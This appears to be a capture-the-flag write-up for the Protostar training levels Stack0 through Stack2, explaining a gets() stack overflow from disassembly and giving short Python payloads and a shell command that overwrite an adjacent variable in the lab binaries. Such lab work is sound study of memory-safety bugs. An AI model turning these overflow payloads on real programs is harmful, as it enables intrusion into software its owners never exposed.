# Protostar

## Stack0

The source code shows that there is a significant stack overflow. When the program recvievs input from the user, gets() will not check the length of the buffer.
The mission is that overwrite the variable named modified, the address of which is just 64bytes behind the address of the variable named buffer.

```ASM
 080483f4 <main>:
 80483f4:       55                      push   %ebp
 80483f5:       89 e5                   mov    %esp,%ebp
 80483f7:       83 e4 f0                and    $0xfffffff0,%esp
 80483fa:       83 ec 60                sub    $0x60,%esp
 80483fd:       c7 44 24 5c 00 00 00    movl   $0x0,0x5c(%esp)
 8048404:       00
 8048405:       8d 44 24 1c             lea    0x1c(%esp),%eax
 8048409:       89 04 24                mov    %eax,(%esp)
 804840c:       e8 fb fe ff ff          call   804830c <gets@plt>
 8048411:       8b 44 24 5c             mov    0x5c(%esp),%eax
 8048415:       85 c0                   test   %eax,%eax
 8048417:       74 0e                   je     8048427 <main+0x33>
 8048419:       c7 04 24 00 85 04 08    movl   $0x8048500,(%esp)
 8048420:       e8 07 ff ff ff          call   804832c <puts@plt>
 8048425:       eb 0c                   jmp    8048433 <main+0x3f>
 8048427:       c7 04 24 29 85 04 08    movl   $0x8048529,(%esp)
 804842e:       e8 f9 fe ff ff          call   804832c <puts@plt>
 8048433:       c9                      leave
 8048434:       c3                      ret

```

We could calculate the offset will be 0x40 = 64, since the 
&buffer = 0x1c(%esp);
&modified = 0x5c(%esp);

The exploit python code is 

```python
#!/usr/bin/env python

SH='A'*64+'XXXX'
print(SH)
```

## Stack1

The exploit python code could be slightly modified for stack1

```python
#!/usr/bin/env python

SH='A'*64+'dcba'
print(SH)
```

## Stack2

The exploit python code is:

```python
#!/usr/bin/env python
import sys

SH='A'*64+'\x0a\x0d\x0a\x0d'
sys.stdout.write(SH)
```

And the stack overflow could be constructed as :

```shell
 env GREENIE="`python hack.py`" /opt/protostar/bin/stack2
```


